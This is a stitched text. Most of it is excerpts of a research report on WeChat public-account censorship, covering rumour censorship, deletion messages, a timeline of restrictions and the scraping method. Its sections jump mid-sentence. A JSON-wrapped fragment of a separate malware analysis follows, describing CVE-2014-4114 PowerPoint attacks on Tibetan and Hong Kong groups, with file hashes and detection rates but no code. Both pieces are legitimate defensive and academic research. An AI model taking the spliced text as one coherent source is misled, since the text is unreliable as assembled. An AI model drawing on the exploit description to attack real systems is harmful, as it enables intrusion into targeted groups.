larger WeChat corpuses might be performed to deduce what other keywords trigger a post to be held for further review and/or denied publication.\nIn addition to looking at the articles in aggregate, we analyzed 150 censored posts, each from a different active user account. These 150 posts covered an array of topics, with 10 containing images of naked women, 14 whose main topic was corruption, and 8 relating to cases of suppression by police. Most curious were 11 posts relating to various superstitions and Chinese folk religion. The targeting of Buddhas, the zodiac, and other quasi-religious omens appears to fit with the effort to curtail “superstitious rumors,” efforts which have historical roots but have not manifested themselves in more recent online media censorship, but have a long tradition of being suppressed in Chinese history. Furthermore, “feudal superstition” is a category of content specifically mentioned as being prohibited in WeChat’s Chinese-language “Service Agreement”—but not in the English-language “Acceptable Use Policy”—a point further discussed in the next section.\nWe find a remarkably low number which would qualify as spam. Of the 150, only one post—an advertisement for an arthritis medicine—was clearly spam, while some of the 11 superstitious posts—which often have a call to action to forward and share the post or suffer some unlucky fate, akin to a chain letter—might also qualify as such. This paucity of spam in our WeChat dataset stands in stark contrast to the challenges other researchers have faced when dealing with Weibo content and may speak to the effect that WeChat’s rigorous sign-up process for an account may have on spam or how effective the pre- and post-review filters are at removing spam.\nLess clear-cut were dozens of posts that contained rumors, misinformation, or some form of speculative commentary. We classified these as posts whose primary purpose was to share unverified or even false information. These included posts that featured dubious health claims, Chinese traditional medicine, made-up science, and conjecture about the future of political figures, a selected sample of which are included in Table 2. While some of these are clearly inflammatory (for instance, the post about Africans who have illegally immigrated to Guangzhou and are marrying Chinese women, featuring a photo of three black men carrying a limp woman) and fit with past censorship of rumors that might cause panics,vi others are do not appear to be destabilizing or even harmful. A number are more typical of sensationalism or tabloid gossip, for instance the claim that Jack Ma’s son had died or the story about a 5-year-old girl developing liver cancer due to a diet of ramen. Other articles that do not appear necessarily destabilizing or particularly critical of Chinese officials or policy include posts related to historical revisionism or historical figures, as well as general commentary of political news. Again, while these posts have little to no collective action potential and are unlikely to cause destabilizing panics, they fit with the recent concerted efforts by Internet regulators to crack down on online falsehoods and political news as stated in the August 2014 SIIO regulations on “instant messaging tools” (see Appendix: Documented Cases of WeChat Restrictions).\nThus, these findings about political keywords being found in great proportion in censored posts and posts about non-collective action rumors being censored appear to be at odds with King, Pan, and Roberts’ 2013 and 2014 findings—which concluded that despite a diversity in tactics in how social media platforms censor, on the whole, it is content related to collective action (both pro- and anti-government ones) that is most heavily censored while even “vitriolic blog posts about even the top Chinese leaders” are often allowed to persist. However, King, Pan, and Roberts’ data was drawn from hundreds of social media sites, and specifically, their analysis centered on censorship within volume bursts, that is, the flurry of censorship after and in reaction to a particularly sensitive event, which this study does not focus on. And while the authors make sure to qualify their conclusions in their papers, it may be possible to unintentionally make overly-generalized statements about what is censored online in China based on their excellent work.\nThus, this report, along with recent studies of social video platforms in China by Knockel et al.62 and nationalism on Weibo by Cairns and Carlson,63 remind us that Chinese Internet censorship is neither monolithic in tactics nor outcome. While we agree with King, Pan, and Roberts that a great deal of intense government criticism takes place throughout the Chinese Internet space and that collective action is an issue of primary concern for censors and authorities, our analysis of WeChat maintains that such conclusions may not apply for all Chinese Internet platforms and applications, even very popular and highly-scrutinized ones like WeChat. Furthermore, new government initiatives like the 2014 “Clean the Web Operation” (净网行动)64 or the anti-rumor campaign may render outmoded previously observed trends. We thus offer a cautious note about applying any comprehensive theory about an ecosystem as varied and fast changing as the Chinese Internet.\n\nThe Collective Power of Rumors in China\nThough the recent campaign against rumors had its seeds in various government pronouncements from 2011,65 it has been in the past two years that it has gathered even greater momentum. In September 2013, the Supreme People’s Court issued guidelines that criminalized the sharing of defamatory or destabilizing misinformation that was forwarded over 500 times or viewed more than 5,000 times,66 a release that was presaged by a number of arrests and detentions of social media users, 67 68 including that of Charles Xue, that were much publicized in state media. Later that month, the new regulation was cited as the basis for the arrest of a 16-year-old student in Gansu Province, Yang Hui, who questioned the findings of a police investigation of a suicide case.69 He was released a week later after police declined to try him and the director of the county’s public security bureau was fired,70 an incident that reinforced for many the fact that rumors can carry as much truth as the words of the government. As Min Jiang notes, “Instead of increasing government transparency and responsiveness, the state’s demonization of ‘rumor’ produces a chilling effect on the public’s ability to know, to question and to act.”71\nThe reasons behind why the CPC employs such a strategy of information control with such downsides have been explored in Esarey and Xiao’s application of information regime theory to China72 as well as Rogier Creemers’ “Cyber-Leninism” essay, which outlines the importance of historical Party ideology on the CPC’s current stance toward the Internet.73 Seeing the Party through the historical lens of Creemers’ essay is extremely helpful for thinking about the roots of the current anti-rumor campaign and why rumors are viewed so negatively by modern Chinese officials, a topic Steve Smith examines in his work.74 75 Smith notes how rumor can often act as a form of political resistance, writing:\nFor Communist regimes, rumor represented both a form of unauthorized speech (and thus a potential threat to social stability) and a useful insight into popular attitudes and mood. This ambivalence reﬂected the dilemma of the regimes, which on the one hand were “wary of allowing citizens to express uncensored opinions about matters of public import in public,” and on the other were “extremely anxious to know what people were thinking.”76\nLiu, in an analysis of the spread of rumors spread by mobile phone in six different case studies, writes similarly about the power of rumors:\nThe official assertion and accusation aims to not just obliterate rumors, but to deprive people of their legitimate rights to free speech and information flow, and further to silence people’s comments, doubts, questions and inquiries towards “the official story” by establishing deterrence. In this context, to circulate rumors… becomes a simple, but basic way for each person to show his/her suspicions, distrust and challenges toward the dominant public sphere and its hegemonic discourse. Obviously, this action displays a gesture of political confrontation… Additionally, in citizens’ minds, the more people join the dissemination of rumors, the louder the clamor of those unjustly oppressed grows. In other words, the aim of circulating of rumor… is not just to reveal the truth, which has been covered-up (e.g. unusual death), or to embarrass those individuals or institutions (e.g. local government) in power, but to mobilize citizens…77\nHu Yong’s “Rumor as Social Protest” further expands on this point of rumor serving as a sort of collective response to injustice and a kind of weapon of the weak.78 The notion of rumor as protest is particularly heightened in environments where there is a major credibility gap in what is published by authorities. While there is conflicting evidence over how skeptical Chinese citizens are of the various media they have access to,vii the explosion in the publication and sharing of unverified information in the past few years speaks to both a desire to express one’s mind and a collective desire to ensure there is a counter-power to potentially false official statements. As Cheng Yizhong, the founder of the Southern Metropolitan Daily newspaper stated, “Rumors are the penalty for lies… They are a rebellion of speech by the weak against power, a small ill hoping to overthrow a great evil.”79\nThe response by authorities to this “rebellion” certainly depends on the context of the times. A certain level of rumors or critical commentary on the Internet has always been acceptable as a form of “safety valve,”80 but the line is always in flux and it appears to have narrowed recently for issues like corruption. Adjusting the level of censorship is a delicate act, as Peter Lorentzen models in “China’s Strategic Censorship.”81 A limited amount of open, critical reporting can benefit the government in duties like rooting out corrupt local officials. But in (relatively) decentralized media like the Internet, performing partial censorship is difficult. Lorentzen posits that to compensate for this, authoritarian governments might tighten their grip on traditional media even further in order to ensure there is a countervailing balance to more critical online commentary.\nHowever, if citizens are aware of this shift beyond even what was the norm previously, there may be an even greater reliance on independent media like online news, with little regard for whether the independent source is reputable or not. Thus, the online anti-rumor campaign serves as a valuable tactic for not only curtailing independent media sources through censorship but also for the larger goal of impugning the veracity of all independent, “unapproved” media sources, tilting the balance over control back in the government’s favor. Authorities have used the language of disease and addiction to portray rumors as malicious, unhealthy, destabilizing, and immoral—in addition to potentially criminal. Citizens have certainly heard this message, which has been broadcasted widely by reports and statements in traditional media. This has generated substantial public support for the campaign—with some Internet users even forming so-called volunteer “anti-rumor leagues” to enlist in the fight to debunk false rumors. Whatever the actual outcome to this campaign might be, it seems certain that online censorship in China changes depending on the circumstances and now might be a particularly sensitive time especially considering the slowing of China’s economy.\nViewed in this whole context, online rumors have much greater power than the mere contents of the message. Even if they are not specifically connected with rallying masses netizens to a cause, the transmission of even the most dubious of claims is still indicative of another kind of collective movement—an attack on the pervasive censorship system which has inclined online users to develop an extreme form of “skepticism literacy”82 wherein, as Hu Yong suggests, “news looks like rumor and rumor looks like news.”83 In such an environment, the spread of rumors on WeChat is not surprising—and considering their implicit criticism of the credibility of authorities, nor is the counter-reaction by government officials and social media companies to restrict them.\n\nThe Ambiguity of Censorship Messages\nAs mentioned previously, the actual censorship message displayed by WeChat when one attempts to access a deleted post is “This content has been reported by multiple people, and the related content is unable to be shown.” (此内容被多人举报，相关的内容无法进行查看。) While the message makes clear that WeChat has removed a post, the source of the deletion is attributed to a WeChat users’ peers. If one takes the message at face value, WeChat is playing the role of a fairly hands-off moderator, letting users decide whether a piece of content is appropriate, and only acting as a judge after a post has been flagged too many times. And this may very well be possible for some of the censored posts we captured—particularly those related to relatively non-sensitive rumors, which may be difficult for WeChat to identify through algorithms, but easy for concerned users to flag. However, what is the likelihood that all the messages we have detected as being deleted are actually being reported by users who genuinely find the content of the posts objectionable?\nIdentifying what Chinese Internet users find objectionable is certainly beyond the scope of this report, but barring access to the psyche of WeChat users themselves as they encounter sensitive material, we are able to identify the mechanisms that WeChat allows for the reporting of potentially offensive articles. A user can report a post via two methods in the international version of WeChat: 1) the “Report” link at the bottom of a post (see Figure 3), triggering the categories shown in Figure 6 that a user can classify an offensive article as: fraud; pornography; political rumor; general knowledge rumor; promoting sharing for misleading purposes; malicious marketing; collecting private information; plagiarism; other (impersonation, slander, plagiarism); and 2) the context menu at the top, which leads to the option to select among the following categories: Porn, Scam, Harassment, Copyright Infringement, Others (Figure 7). These broad categories cover most of the activities outlined as forbidden in section eight of WeChat’s Chinese-language Service Agreement,84 which is much more extensive than WeChat’s English-language “Acceptable Use Policy.”85 The English-language version does not specifically refer to “feudal superstitions” and rumors as being off-limits while they are specifically cited in section 8.1.2.1 of the Chinese-language Service Agreement (“破坏国家宗教政策，宣扬邪教和封建迷信的”; “散布谣言，扰乱社会秩序，破坏社会稳定的”).\nIn trying to understand why certain articles are deleted, one cannot help but come to the conclusion that WeChat is perhaps taking a more interventionist role than the error message suggests. The content in the deleted posts is similar to the sensitive content that routinely gets scrubbed from Weibo and other platforms: rumors of Communist Party nepotism, snide political jokes and other forms of satire, images of scantily-clad (if clad at all) women and so on. While one might expect an average WeChat user to object to pictures of naked women, it is hard to explain why such a user would go out of his or her way to report, for example, a series of photos skewering the antipathy among Chinese officials toward carrying their own umbrellas (Figure 8).86 Would WeChat users go out of their way to report a post that offends their sense of national pride in their politicians? If so, they do have the option to mark the post as a “political rumor,” but what is the likelihood that a typical user would do this?\nUtilizing ambiguity fits well with the increasingly sophisticated measures being taken on the Chinese Internet to obscure the filtering that is taking place. On Weibo, searches for certain keywords will report back by default that there are zero results; it is only when a user clicks through at the bottom for all results does an error message appear stating that the search was in fact censored.87 On Chinese online encyclopedias, users can often see articles which appear to cover sensitive topics, but once they attempt to edit them, they are told they do not have the requisite privileges to do so.88 Official government social media accounts also often steer conversations and can drown out dissenting commentary—a de facto form of censorship aided by service providers who promote those accounts.\nCensorship has obviously long since ceased being a binary thing on the Internet. Is Twitter’s regional filtering censorship? What about the way Google customizes and prioritizes its search results? Or when Facebook decides to remove a user’s post? Similarly, WeChat appears to tread in ambiguous waters as well, forcing us to ask questions like: Are those who object to a given post regular users, or are they employees of either WeChat or the government? How many users must object before a post is taken down? Are there automated algorithms that assist in flagging content to be reviewed? In a 2014 Wall Street Journal China Real Time inquiry into deletion practices on WeChat’s official accounts, Tencent would only say that it took unspecified measures against “offensive and abusive activities,” based on user feedback and “in line with relevant guidelines on illegal and pornographic content.”89 Ideally, a company which is the gateway to so much information for Internet users would offer more information about what, why, and how information is removed from its services, but one can certainly empathize with the challenges Tencent faces in terms of moderating the content shared on its public accounts platform. Thus, beyond offering some transparency into the types of content that WeChat censors, hopefully this report continues the much-needed discussion about what constitutes censorship—and what responsibilities companies have—in complex regulatory and social environments around the world.\nConclusion and Future Research\nAfter performing a systematic collection of deleted WeChat posts, our report examines these posts and analyzes what is deleted: we find that posts relating to political news and rumors appear to be targeted for censorship to a greater degree than previously noted in past research, either a possible reflection of the ongoing “anti-rumor campaign” sweeping Chinese social media or the fact that WeChat may be an exception to the notion that it is primarily content related collective action that is deleted from Chinese social media. We also show the ways that a post may be flagged by regular users for deletion and connect WeChat’s approach to the ambiguity of censorship messages found in other Chinese social media. Finally, the power of online rumors is discussed. It is useful to view China’s modern attempts to control information through the lens of history, and online rumors can be viewed as a kind of social protest by citizens skeptical of official news and the censorship of more independent sources of media. It is in this way that one can gain a deeper understanding for why censorship of unverified information appears to be so prevalent on WeChat’s public accounts platform.\nThis report is not meant to be the definitive final word on censorship in WeChat’s public accounts platform. In order to more fully flesh out the possible keywords which are triggering the sort of automatic review which prevent Liu and Zhu’s posts from being published, we’ll need to collect even larger corpuses of WeChat posts. Furthermore, we do not capture our posts directly from WeChat nor in real-time, and thus we potentially miss posts which are censored immediately after publication. Developing better methods to deal with the challenges of collecting data from WeChat’s public accounts platform would allow us to collect better samples from which we could generalize across the entire platform as well allow as allow us to compare WeChat’s censorship to other social media like Weibo. Confirming the authenticity of self-deleted messages as well as collecting post metadata (the likes and pageviews shown in Figure 3) are also future goals. Our project tracking and collecting these public posts is ongoing, and hopefully this report demonstrates to other researchers some of the various methods for collecting this data as well as the opportunities for doing so, particularly as WeChat’s usage as a public forum continues to grow.\n\n\nAppendix: Figures and Tables\n\nFigure 1: WeChat users have numerous ways to easily share an

In addition, he reports that messages transmitted through WeChat to his colleagues were recited back to them by authorities in full detail almost immediately after they took place.90\nJanuary 2013: During the Southern Weekend controversy (discussed previously), Tech in Asia reports that chat messages with “南方周末” (Southern Weekend) would be blocked from sending. The Next Web confirms they received a similar error message indicating their message was blocked when they tried “法轮功” (Falun Gong).91 The following day, this censorship appears to disappear and Tencent releases a statement claiming that “a small number of WeChat international users were not able to send certain messages due to a technical glitch.”92\nOctober 2013: A Tibetan woman is arrested for allegedly expressing “anti-China” sentiments over WeChat.93\nJanuary 2013: A Xinzhou City man is arrested after posting a rumor to WeChat saying that a local medical worker had died of bird flu. China Daily reports that after the post became popular, authorities identified him by using his WeChat screen name.94\nMarch 2014: In the first mass assault on public accounts, Tencent suspends over 40 public accounts,95 most dealing with political and legal news. No official reason was given to the account holders by Tencent,96 and The Wall Street Journal cited user speculation that the accounts were shut down less for their content and more due to the fact that they were quite popular, with some having over 200,000 followers.97 A handful of the accounts are later re-instated.\nMay 2014: SIIO announces that in a joint effort with the Ministry of Industry and Information Technology and the Ministry of Public Security, the three agencies start a “special operation” to target rumor spreading, violence, terror, fraud and pornography on instant messaging services.98 99\nJuly 2014: All residents in Zhaoqing City in Guangdong province were ordered to register their WeChat account information with the local police. The decree was the first of its kind.100\nAugust 2014: SIIO announces new regulations on “instant messaging tools,” a clear attempt to rein in WeChat and its growing public accounts platform. Among the new edicts (outlined in ten points, which are colloquially known as the “WeChat Articles”) is a requirement for real name registration, and a prohibition of posting political news and current affairs unless an account has government approval to do so.101 The latter is especially vague, and according to Hu Yong, depending on how one interprets what constitutes current affairs reporting, this could potentially include opinion articles and commentary.102 Tencent also reports that it has already designated 200 people to review complaints on the site,103 and they have deleted 3,000 articles and suspended more than 400 official accounts since the beginning of the special operation in May.104\nSeptember – Oct 2014: There are reports that comments in small group chats about the ongoing Occupy Hong Kong protests have been mysteriously deleted105 and that photos posted by Hong Kong users to their personal news feeds (the “Moments” feature) are not viewable by mainland WeChat users.106 Public accounts were also reportedly unable to post articles containing both “Hong Kong” and “protest” and Moments posts by mainland users about the protests were deleted.107\nJanuary 2015: 133 public accounts are suspended “for distorting Chinese history and the history of the Communist Party of China” according to a statement by the Cyberspace Administration of China.108\n\n\nAppendix: Method for Identifying Deleted Public Posts and Limitations\nWeChat’s public accounts are a “semi-public” network in that, though all WeChat public posts are navigable from the general Internet, one needs the exact URL of the post—which contains the user id of the author, the message id of the post, the index number of the post,x and a 32-digit verification key, which is unique for each post—in order to successfully access the page outside of the WeChat app.xi\nAnd while WeChat allows individual posts to be viewed outside of the app environment, in order to load the index pages (which list all the articles and their corresponding URLs for each account, allowing for large scale scraping) one needs a time-limited 96-character verification key. Thus, in order to effectively utilize this method, one would need to update this 96-character verification key every time it expires in order to continue loading new index pages. At the moment, identifying the 96-character verification key requires performing a packet capture while the app is running in an mobile emulator environment, and automating this process would make this method more viable and allow for the capture of larger, unbiased samples of WeChat posts.\nWeChat’s various publicly available APIs do not appear set up to allow scraping of official account information. Furthermore, efficiently scraping and exporting information from within the native app environment is currently constrained by the limited scripting tools available for interacting with the app in Android or iOS. If new, easier-to-use tools or an expanded API are made available in the future, each of these approaches would become more effective.\nDue to these various technical challenges, in the end we decided to search third-party websites which contained WeChat urls as the basis for the collection of public account posts.\nTypically, WeChat posts are read and shared from within the app; however, while reading a public post in WeChat, users have the option of copying the URL of the post in order to share it outside of the WeChat app. Once the URL is obtained, a non-WeChat user can navigate to and view the content of the post from a browser without any logins or other hurdles.xii We identified Twitter and Weibo as websites where users shared links to WeChat public posts, indicated by any link that contained “mp.weixin.qq.com” (for Twitter) and “mp.weixin” (for Weibo). We searched Twitter’s API and Weibo’s front-end search page and downloaded any valid WeChat public account posts that were found. The script would check previously collected posts on a regular basis (we currently check posts collected within the past three days once every 4 hours; posts that were initially collected more than three days ago are checked once a day for one month, and one final time two months laterxiii) and when a post was later found to be deleted (as indicated by the censorship message—”此内容被多人举报，相关的内容无法进行查看”), the stored copy could be referred to.\nOne limitation of this method is that the collected sample of WeChat posts that are linked to from the Internet is obviously biased and highly dependent on the source they were drawn from. For instance, if one was to only collect links to WeChat posts that were found on a cat website, a person might think WeChat was primarily a website for cat pictures and that comparatively little censorship took place on the service. Our sources (Twitter and Weibo) were predominantly popular social media websites because they offer the ability to easily and regularly search for new Chinese content, with results presented in a uniform structure conducive to collection. Twitter, which was the primary source for the posts analyzed in this report, would be particularly biased since the Chinese users who post there would be a very self-selected group: a sample of posts found linked on Twitter would likely over-represent content which is sensitive in nature because of the characteristics of the users themselves—users who both desire and are capable of crossing the Great Firewall.\nHowever, if one has limited resources and is purely interested in collecting posts which will be deleted in the future, focusing on a source like Twitter is arguably more efficient since a greater percentage of the links found there would lead to sensitive content—relatively less time would be spent checking prosaic, non-sensitive content. So while generalizing about the types of content on WeChat public accounts as a whole by using the data collected for this report is limited, by looking at the deleted posts that we are able to capture, we can potentially identify broader trends about types of content which would likely be banned so long as the sources we draw from are not biased towards any particular types of sensitive content. Individual deleted posts might also be worth studying on their own, independent of their context within the collected sample. Thus, examining the deleted posts found in this manner can be fruitful so long as one is aware of the limitations about generalizing from the sample. And as mentioned above, future steps could also be taken to investigate other data collection methods which are at the moment technically difficult in order to generate a less biased sample of WeChat posts.\nAlso, as mentioned, we do not currently capture our posts in real-time (71% of our dataset was captured only after a link to the WeChat post was shared on other social media like Twitter or Weibo), we would miss posts which are censored immediately after publication (or at least before they are shared). And as Zhu et al. note, 30% of the censored posts they collected from Weibo in their study were deleted within the first 30 minutes. Furthermore, a firsthand study by Liu and Zhu noted how automated filters often kept sensitive content from being actually published in the first place—and thus lessen the amount of content in need of censorship after. These factors, among others, might skew the types of censored content we are able to collect. For instance, if certain kinds of ultra-sensitive posts were always censored within 1 minute—before someone anyone could read or share it—our sample would undercollect that kind of content. And if users were not able to publish any posts that contain “六四” (as our data indicates), we would have an inaccurate sense of what content authorities were actually targeting for censorship if we only looked at the collected data.\nAnother method currently used in this project to collect data is to scrape third-party websites like 传送门 and 搜狗 which re-host WeChat public account information. At the moment, because of a desire to focus resources on searching for content which is more likely to be sensitive, we only use this method to track 48 individual accounts, collecting links to public account posts as it is published on the third-party site. Twenty-three of the tracked accounts came from a list provided by China Digital Times of accounts they wished to follow; these were accounts thought to post sensitive content. In addition to those 23, if an account was found to have posted censored material multiple times in our database, they were also individually tracked and all their posts downloaded as their links were published by third-party sites.\nIn the sample analyzed in this report, 28.5% of the posts are collected in this manner (the other 71.5% are found via Twitter; the collection of posts found via Weibo began after the data analysis in this report was completed). Using data from these sites, we can also automatically look up whether a user’s account has been suspended or not. xiv Navigating to WeChat posts from users whose accounts have suspended will return the same error message as censored posts from active users as seen in Figure 2. As we are interested in what content is specifically targeted for censorship, differentiating between the two kinds of censored posts is crucial when doing the final analysis.\nObviously, this method could be expanded at the cost of greater resources spent sifting through less obviously sensitive content. Furthermore, sometimes the data from these third-party websites can be incomplete, and thus an ideal methodology for collecting the data would rely on one of the previous methods identified in this section and eliminate the need to rely on a third party.\nAcknowledgments\niThe author wishes to thank the Open Technology Fund’s Information Controls Fellowship Program, China Digital Times, and The Citizen Lab for supporting this research; Masashi Crete-Nishihata and Jeffrey Knockel for comments; Joyce Minjie Zhao and Kun (Cleo) Zhang for translation assistance; and Jakub Dalek for technical assistance.\nNotes\n\nii One catch is that users who register with a mainland Chinese phone number are unable to access international public accounts; non-mainland users, by contrast, can access both Chinese and non-Chinese public accounts. This limitation is no doubt designed to alleviate the need to censor foreign companies who posted sensitive material. Foreign companies who seek to reach mainland Chinese users must apply for a Chinese-language public account, which requires a much more stringent set procedures, including submitting a Chinese identification card, Chinese business license, and a Chinese organization code.\niii The other languages that had more than .05%: Japanese (.19%), Tibetan (.17%), Korean (.07%), English (.06%), Malay (.05%).\niv A more accurate description would be 1.53% of unique accounts within our sample were suspended within two months of their last captured post. The actual number of accounts suspended may be higher than 154 since we only re-check whether an account is still active for two months from the date of their most recent post in the database. (For example, if we capture a post from a user in March, we would check regularly until May whether the post (and by extension the user’s account) had been deleted. If another post from that user is collected in April, the clock restarts and the account will now be checked until June. However, it is possible that the account may still be suspended even if they cease posting new articles or none of their articles happen to be picked up by our data collection methods. Furthermore, it is also possible the percentage could be lower if suspended accounts are unsuspended, which is what happened to some in March 2014.) This is done to save resources and future changes to the data collection method will hopefully correct for this potential oversight.\nv Sortable spreadsheets containing calculations of both sets of keywords can be found at http://bit.ly/wechat-table and http://bit.ly/wechat-table2.\nvi The classic example being the rumor which was circulated online throughout Zhejiang in 2011 after the Fukushima meltdown that the iodine in salt would protect people from radiation, leading to mad rushes to buy salt. The rumor was subsequently censored online.\nvii According to the 2010-2014 World Values Survey, Chinese respondents replied that they had “a great deal” or “quite a lot” of confidence in the press (41.4%) at a lower rate than those from Hong Kong (60.2%) but at a similar rate to American respondents (40.2%). The 2015 Edelman Trust Barometer put Chinese trust in traditional media at 80%, social media at 73%, and owned media at 68%, higher than the respective response rate of each from Hong Kong respondents (54%, 49%, 43%).\nviii The post can be read in full at: Jason Q.

The need for a verification key deters large-scale downloading and scraping of random posts from outside the app.\nxii The content of the WeChat post viewed within the app and outside the app are exactly the same except for some slight formatting differences, the breaking of a few app-specific links (for instance, clicking the author name within the app takes you to the user’s profile; outside of the app, that same link points to “javascript:void(0);” and does nothing when clicked) and the loss of metadata at the bottom about the post, which reports the number of views and “likes” for the post (which are represented with a “thumbs up” icon nearly identical to Facebook’s; see Figure 3). The only way to access this information outside the app is to mimic a mobile browser environment by changing the User-Agent to “MicroMessenger,” and then supplying a 96-character verification key which expires after about an hour.\nxiii For more rigorous data collection and analysis in the future, the time between tests could obviously be reduced (and potentially even done in real time) and the duration of daily testing extended past one month.\nxiv The third-party sites we rely on for this data collect data for most but not every WeChat public account. For those whose data is not collected, one can manually look up whether an account is still active by taking their user id and generating a QR code (replace BIZ_ID with the user id in the following link: http://mp.weixin.qq.com/mp/qrcode?scene=10000001&size=102&__biz=BIZ_ID==), then scanning the code within WeChat to reach a user’s profile page. A suspended user will return a message of “This account has violated WeChat Admin Platform policies and has been forbidden from using all Official Account features.” or “This Official Account is suspended and cannot be accessed.” (see Figure 4) when one attempts to follow the account and shows no archived posts when “View history” is chosen.\n1 Gary King, Jennifer Pan, and Margaret E Roberts, “How Censorship in China Allows Government Criticism but Silences Collective Expression,” American Political Science Review, 2013, http://gking.harvard.edu/files/censored.pdf.\nGary King, Jennifer Pan, and Margaret E Roberts, “Reverse-Engineering Censorship in China: Randomized Experimentation and Participant Observation.” Science, 2014, 345(6199): 1-10, http://gking.harvard.edu/publications/randomized-experimental-study-censorship-china\n2 Seva Gunitsky, “Corrupting the Cyber-Commons: Social Media as a Tool of Autocratic Stability,” Perspectives on Politics, (13)1, March 2015, http://individual.utoronto.ca/seva/corrupting_cybercommons.pdf.\n3 Lu Pin [吕品], “危机事件中的微博效应及其应对,” 学习时报 Study Times, Aug 6, 2012, http://www.studytimes.com.cn:9999/epaper/xxsb/html/2012/08/06/05/05_34.htm.\n4 Guobin Yang, The power of the Internet in China: citizen activism online.

    "text": "\n\t\t\t\tAuthors: Katie Kleemola, Masashi Crete-Nishihata, and John Scott-Railton\nMedia Coverage: Motherboard, Engadget, CSO.\nDownload PDF version\nIntroduction\nThis post analyzes targeted malware attacks against groups in the Tibetan diaspora and pro-democracy groups in Hong Kong. All of these attacks leveraged CVE-2014-4114 and were delivered via malicious Microsoft PowerPoint Slideshow files (*.pps). These attacks are highly targeted, appear to re-purpose legitimate content in decoy documents, and had very low antivirus (AV) detection rates at the time they were deployed.\nThe attacks against Tibetan groups shows a change in tactics from previous campaigns. Over the past four years the majority of attacks we have seen against Tibetan groups use CVE-2010-3333 or CVE-2012-0158. The use of CVE-2014-4114 marks the first time we have observed a change from this pattern in the last two years.\nOne attack sent to Tibetan groups used a link to a file on Google Drive to deliver the malware. Groups in the Tibetan community have promoted awareness campaigns around e-mail attachments, which have been the most common attack vector for the community.  This campaign, “Detach from Attachments,” urges users to avoid sending or opening email attachments, and to use cloud-based storage to send files like Google Drive as an alternative. The use of Google Drive to send malware may be evidence of attackers adapting to the behavioral countermeasures promoted by the campaign.\nIn addition to the use of the same CVE, some of the attacks targeting Tibetan rights groups and Hong Kong groups have overlap in malware family (PlugX) and Command and Control (C2) domains. The similarities between these attacks suggests that either they are being conducted by the same threat actor or threat actors targeting these groups are sharing tactics, techniques, and procedures (TTPs).\nTargeting and Social Engineering\nWe observed a total of five malware campaigns that used CVE-2014-4114 and a range of social engineering tactics to persuade recipients to either open an attachment, or visit a URL and download a malicious file.\nIn all of these attacks, if a recipient double clicks on the .pps file, they are shown decoy content. Examination of the exif metadata of the files indicates that the attackers are likely repurposing material from legitimate presentations.\nPPT files (the more commonly used PowerPoint file extension) are automatically opened in edit mode, whereas .pps files are automatically opened in slideshow mode. For the CVE-2014-4114 exploit to work, the Powerpoint Slideshow needs to be played. Sending .pps files that automatically run a PowerPoint Slideshow is likely an attempt by the attackers to increase the infection rate.\nTibetan Attacks \nOver April and May 2015 we observed 3 attack campaigns targeting a number of Tibetan organizations. The sophistication of the social engineering varied between attacks, but all attacks appeared to use re-purposed legitimate content.\nTibet Attack 1: April 2015 \nThe first attack we observed was sent to multiple Tibetan groups over the course of April 2015. The email text is taken from a website related to an advocacy campaign and report by the International Tibet Network (ITN), a prominent Tibetan rights group. The email signature includes the real office address of ITN. However, the sender’s email address (tibet_net@yahoo.com.hk) is not a legitimate address related to the group. Attached to the email was a .pps file that repurposes slides from a presentation related to the same report and advocacy campaign referenced in the email message.\nEmail lure sent to Tibetan groups\nImage from decoy PowerPoint Slideshow file.\nTibet Attack 2: April 28, 2015\nThe second attack was sent out on April 28 2015 to multiple Tibetan organizations. The email message references a recent visit between Archbishop Desmond Tutu and His Holiness the Dalai Lama (HHDL). The .pps attachment also referenced the event and appears to be repurposed from legitimate material.\nTibet Attack 3​​​: May 6 2015\nThe third attack was sent to Tibetan groups on May 6 2015 and contained a simpler message than previous attacks that urges the recipient to download a file from Google Drive, appears to repurpose legitimate content.\nDear Sir/Madam,\nI have shared the Biography of H.H. THE 14TH DALAI LAMA via Google Drive.\nKindly download it.\nPowerPoint Slideshow files do not display properly on Google Drive, and therefore a recipient may be tempted to download and open the file on their computer.  The use of Google Docs is potentially evidence of attackers changing tactics in reaction to the Detach from Attachments campaign.\nHong Kong Attack Campaigns \nWe analyzed two attacks sent over the course of March 2015 that targeted individuals associated with human rights groups and pro-democratic political parties in Hong Kong.\nHong Kong Attack 1: March 6, 2015\nThe first attack was sent on March 6 2015. The email signature was made to appear to come from an assistant of Dr. Margaret Ng who is a Barrister and a former member of the Legislative Council in Hong Kong. The .pps attachment used a decoy document that appears to repurpose slides from an actual presentation Dr. Ng gave to Columbia Law School in February 2015.\n\nHong Kong Attack 2: March 31, 2015 \nThe second attack was sent on March 31 2015, and contained a message related to the Occupy Central protests. The .pps file attachment was also related to Occupy Central and appears to repurpose legitimate content.\nInfection\nDespite the variety of targets and delivery approaches, the malware shares a common infection process. When the PowerPoint Slideshow is played, the malware leverages CVE-2014-4114, a vulnerability in the OLE Package Manager to infect the target machine. Computers using Windows Vista and above are susceptible to this attack.  In addition to the decoy document, the malicious slideshow contains two embedded OLE objects: a .inf file and a malicious executable with a .gif extension that are dropped to the temp folder.\n\nThe .inf file is used to copy the executable and then run it.\n\nThe CVE-2014-4114 vulnerability has been described by Rapid7 and was previously linked to the “Sandworm” Russian threat actor. In these previously reported attacks, the .inf and .gif files are copied from a remote smb share to the victim’s computer. In the attacks we describe here the payload is embedded in the OLE objects, similar to cases described by TrendMicro.\nSince CVE-2014-4114 is a vulnerability in the OLE package manager it makes it possible for attackers to create a PowerPoint presentation in which the OLE package manager loads a fake .gif file (that is actually a malicious executable), and then a malicious .inf file that runs the executable.\nIf a user double clicks on the malicious attachment, the decoy file opens without crashing the program or producing any other obvious signs that something is wrong with the file. This behaviour contrasts with how other common CVEs used to target groups in the Tibetan community (e.g, CVE-2012-0158, CVE-2010-3333) behave, which typically cause the vulnerable program to crash before opening a decoy document.\nThe exploit used in these attacks does not contain shell code, which makes it harder for AV heuristics to detect it. Of the samples we analyzed that have been uploaded to VirusTotal, two currently have 0 detections out of 57 AV engines (see Table 1).\nTable 1: AV Detection Rates\n\n\n\nSample MD5\nAV Detection Rate (Orignal Submission)\nAV Detection Rate (Current)\n\n\n18bb1ce405e4abac4b0fc63054beac6c\nDate / Time: 2015-04-30 13:44:39\nDetection rate: 0/56\nDate / Time: 2015-06-04 11:53:17\nDetection rate: 0/57\n\n\n8a18a13910838d08e38db80a08e15bd5\nDate / Time: 2015-03-06 02:30:16\nDetection rate: 0/57\nDate / Time: 2015-06-05 18:36:01\nDetection rate: 